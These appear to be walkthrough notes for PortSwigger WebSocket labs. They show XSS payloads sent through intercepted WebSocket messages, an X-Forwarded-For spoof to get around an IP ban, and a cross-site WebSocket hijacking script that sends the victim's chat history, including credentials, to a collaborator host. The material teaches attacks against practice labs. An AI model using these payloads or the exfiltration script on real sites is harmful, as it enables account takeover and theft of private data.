### Manipulating WebSocket messages to exploit vulnerabilities

Try to send a script tag, and see it's encoding the "<". 
So, intercept the message in the WebSocket tab, and replace your message with this one:
`<img src=1 onerror='alert(1)'>`

### Manipulating the WebSocket handshake to exploit vulnerabilities

1. Click "Live chat" and send a chat message.
2. In Burp Proxy, go to the WebSockets history tab, and observe that the chat message has been sent via a WebSocket message.
3. Right-click on the message and select "Send to Repeater".
4. Edit and resend the message containing a basic XSS payload, such as:
    
    `<img src=1 onerror='alert(1)'>`
5. Observe that the attack has been blocked, and that your WebSocket connection has been terminated.
6. Click "Reconnect", and observe that the connection attempt fails because your IP address has been banned.
7. Add the following header to the handshake request to spoof your IP address:
    
    `X-Forwarded-For: 1.1.1.1`
8. Click "Connect" to successfully reconnect the WebSocket.
9. Send a WebSocket message containing an obfuscated XSS payload, such as:

### Cross-site WebSocket hijacking

1. Click "Live chat" and send a chat message.
2. Reload the page.
3. In Burp Proxy, in the WebSockets history tab, observe that the "READY" command retrieves past chat messages from the server.
4. In Burp Proxy, in the HTTP history tab, find the WebSocket handshake request. Observe that the request has no [CSRF](https://portswigger.net/web-security/csrf) tokens.
5. Right-click on the handshake request and select "Copy URL".
6. In the browser, go to the exploit server and paste the following template into the "Body" section:

```js
<script> 
 var ws = new WebSocket('wss://your-websocket-url'); 
 ws.onopen = function() { 
	 ws.send("READY"); 
 }; 
 ws.onmessage = function(event) {
  fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data}); }; 
</script>
```

7. Replace `your-websocket-url` with the URL from the WebSocket handshake (`YOUR-LAB-ID.web-security-academy.net/chat`). Make sure you change the protocol from `https://` to `wss://`. Replace `your-collaborator-url` with a payload generated by [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator).
8. Click "View exploit".
9. Poll for interactions in the Collaborator tab. Verify that the attack has successfully retrieved your chat history and exfiltrated it via Burp Collaborator. For every message in the chat, Burp Collaborator has received an HTTP request. The request body contains the full contents of the chat message in JSON format. Note that these messages may not be received in the correct order.
10. Go back to the exploit server and deliver the exploit to the victim.
11. Poll for interactions in the Collaborator tab again. Observe that you've received more HTTP interactions containing the victim's chat history. Examine the messages and notice that one of them contains the victim's username and password.
12. Use the exfiltrated credentials to log in to the victim user's account.
